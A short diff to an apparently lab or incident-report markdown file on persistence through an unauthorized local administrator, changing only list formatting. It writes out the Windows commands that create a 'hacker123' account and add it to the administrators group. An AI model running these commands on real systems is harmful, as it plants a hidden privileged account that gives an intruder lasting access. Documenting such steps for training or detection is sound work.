@@ -1,10 +1,10 @@
 # 03 - Persistence via Unauthorized Local Administrator
 
 **Commands executed:**
-# **New Account Add:**
+* **New Account Add:**
 `net user hacker123 password@123 /add`
 
-**Adding to administrators group:**
+* **Adding to administrators group:**
 `net localgroup administrators hacker123 /add`
 
 **Timestamp of attack:** Oct 21, 2026 @ 20:24:15
